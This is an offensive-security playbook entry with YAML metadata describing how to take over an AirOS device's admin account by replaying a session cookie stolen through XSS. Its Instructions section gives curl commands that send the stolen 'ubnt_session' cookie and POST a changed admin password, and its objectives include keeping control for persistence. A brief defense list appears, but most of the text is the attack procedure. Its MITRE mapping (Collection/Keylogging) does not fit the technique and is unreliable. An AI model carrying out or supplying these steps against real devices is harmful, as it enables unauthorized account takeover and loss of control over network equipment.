---
tags:
  - session-hijacking
  - account-takeover
  - airos
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-session-replay]]'
verified: false
platforms:
  - Web
  - Embedded Device
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Keylogging]]'
updated_at: '2025-12-14T03:46:26.654Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 0f743173-4efa-477f-9af9-943ada8f9b76
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Keylogging]]'
---
# Hijack-Session-and-Takeover-Admin

## Summary

This procedure uses stolen session cookies from XSS exploitation to impersonate the victim and escalate to admin control on the AirOS device.

## Description

After receiving session data via the XSS payload, the attacker replays the cookie to access authenticated areas. On AirOS, this allows navigation to admin panels for configuration changes or credential updates. Prerequisites: Captured session ID, direct access to device IP. Expected: Full admin privileges without re-authentication.

## Requirements

1. Stolen session cookie from exfiltration
2. Network access to replay requests
3. Knowledge of admin endpoint paths (e.g., /admin.html)

## Defense

Defensive measures and detection strategies:

- Implement session binding to IP/user-agent
- Use short session timeouts and HTTPS-only
- Monitor for concurrent logins or unusual session reuse

## Objectives

1. Replay session to gain unauthorized access
2. Escalate to admin functions
3. Maintain control for persistence

## Instructions

### Step 1: Replay Session Cookie

**Context**: Inject the stolen cookie into requests to bypass authentication.

**Command** ([[commands/curl-session-replay]]):
```bash
curl -H "Cookie: ubnt_session=STOLEN_SESSION_ID" "http://<device-ip>/status.html"
```

> Successful response shows authenticated content.

### Step 2: Access Admin Panel

**Context**: Navigate to privileged areas for takeover.

**Command** ([[commands/curl-session-replay]]):
```bash
curl -H "Cookie: ubnt_session=STOLEN_SESSION_ID" -X POST "http://<device-ip>/admin/change_password" --data "new_pass=attacker123"
```

> Update admin password or execute device commands.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Keylogging]]

### Sub-Techniques


## Commands Used

- [[commands/curl-session-replay]]

## Tools Used


## Tags

- session-hijacking
- account-takeover
